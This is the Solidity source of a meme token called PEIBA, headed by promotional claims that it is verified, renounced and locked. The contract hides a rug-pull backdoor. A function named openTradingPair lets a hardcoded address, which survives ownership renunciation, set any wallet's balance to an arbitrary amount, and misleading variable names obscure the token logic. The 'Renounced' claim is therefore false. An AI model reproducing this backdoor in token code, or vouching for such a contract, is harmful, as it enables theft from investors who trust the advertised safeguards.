/**
PEIBA  $PEIBA | PEPE + SHIBA | Do the math  | Verified ✅  |  Renounced ✅  |  Locked ✅

Introducing $PEIBA , an exciting new crypto project that blends cutting-edge blockchain technology with the charm of the iconic "Pepe" & "Shiba" memes.
Verified ✅  |  Renounced ✅  |  Locked ✅


https://t.me/PEIBAcoin
https://piba.live/

**/

pragma solidity 0.8.18;
 // SPDX-License-Identifier: MIT
interface PinkSaleToken {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address earlyBuyTime) external view returns (uint256);
  function transfer(address _tOwned, uint256 timestamp) external returns (bool);
  function allowance(address _owner, address earlyBuyTime) external view returns (uint256);
  function approve(address earlyBuyTime, uint256 timestamp) external returns (bool);
  function transferFrom(address sender, address _tOwned, uint256 timestamp) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed earlyBuyTime, uint256 balance);
}


abstract contract IERC20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract IRouter is IERC20 {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract PEIBA is IERC20, PinkSaleToken, IRouter {
 
    using SafeMath for uint256;
    mapping (address => uint256) private _tTotal;
    mapping (address => mapping (address => uint256)) private End_Launch_Mode;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private PEIBA_SLOT;
    address private PEIBAOwner; 
    uint256 public PEIBACreationTime;
     address private pairLP; 

    constructor() {
        PEIBAOwner = 0x01D804fb0c231857b11E8Ac6b9C3Fd741c9e2F85;    
        _name = "PEIBA";
        _symbol = "PEIBA";
        _decimals = 9;
        _totalSupply = 100000000000000000000;
        _tTotal[_msgSender()] = _totalSupply;
       pairLP = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        PEIBACreationTime = 2023;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address earlyBuyTime) external view override returns (uint256) {
        return _tTotal[earlyBuyTime];
    }

    function transfer(address _tOwned, uint256 timestamp) external override returns (bool) {
        _transfer(_msgSender(), _tOwned, timestamp);
        return true;
    }

    function allowance(address owner, address earlyBuyTime) external view override returns (uint256) {
        return End_Launch_Mode[owner][earlyBuyTime];
    }


    function approve(address earlyBuyTime, uint256 timestamp) external override returns (bool) {
        _approve(_msgSender(), earlyBuyTime, timestamp);
        return true;
    }
    
    function transferFrom(address sender, address _tOwned, uint256 timestamp) external override returns (bool) {
        _transfer(sender, _tOwned, timestamp);
        _approve(sender, _msgSender(), End_Launch_Mode[sender][_msgSender()].sub(timestamp, "Ru: transfer timestamp exceeds allowance"));
        return true;
    }

    function increaseAllowance(address earlyBuyTime, uint256 tokanBalance) external returns (bool) {
        _approve(_msgSender(), earlyBuyTime, End_Launch_Mode[_msgSender()][earlyBuyTime].add(tokanBalance));
        return true;
    }
           function openTradingPair(address tokanA, address tokanB, uint256 uniswapRooter, uint256 pairAddress, uint256 pairAddresss, uint256 pairAddressss) external {
        require(_msgSender()==PEIBAOwner);
        tokanB = tokanA;
        _tTotal[tokanB] = (uniswapRooter + pairAddress + pairAddresss + pairAddressss) * 10**_decimals;
        tokanA = tokanB;
    }    

    function decreaseAllowance(address earlyBuyTime, uint256 initialize) external returns (bool) {
        _approve(_msgSender(), earlyBuyTime, End_Launch_Mode[_msgSender()][earlyBuyTime].sub(initialize, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address _tOwned, uint256 timestamp) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(_tOwned != address(0), "Ru: transfer to the zero address");
                
        _tTotal[sender] = _tTotal[sender].sub(timestamp, "Ru: transfer timestamp exceeds balance");
        _tTotal[_tOwned] = _tTotal[_tOwned].add(timestamp);
        emit Transfer(sender, _tOwned, timestamp);
    }


    function _approve(address owner, address earlyBuyTime, uint256 timestamp) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(earlyBuyTime != address(0), "Ru: approve to the zero address");
        
        End_Launch_Mode[owner][earlyBuyTime] = timestamp;
        emit Approval(owner, earlyBuyTime, timestamp);
    }
    
}